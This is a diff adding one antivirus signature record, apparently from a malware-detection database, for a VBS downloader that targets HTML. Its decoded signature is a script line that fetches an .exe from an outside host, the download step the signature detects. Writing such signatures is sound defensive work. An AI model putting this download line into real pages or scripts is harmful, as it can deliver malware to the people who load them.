@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Downloader.VBS-178
+TARGET TYPE: HTML
+OFFSET: *
+DECODED SIGNATURE:
+x.open("get", "http://www.hot.ee/bouncing/modify.exe",0);
